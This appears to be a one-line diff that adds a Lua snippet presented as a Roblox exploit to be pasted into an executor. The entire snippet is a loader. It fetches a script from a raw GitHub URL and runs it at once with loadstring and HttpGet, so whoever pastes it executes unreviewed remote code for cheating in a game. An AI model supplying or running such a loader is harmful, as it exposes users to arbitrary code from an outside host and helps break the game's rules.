@@ -1,0 +1,1 @@
+"--[[\nSakura's Roblox exploit — paste into your executor\n]]\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/FaddedMarket/roblox-scripts/refs/heads/main/script%20hub/main.lua\"))()"
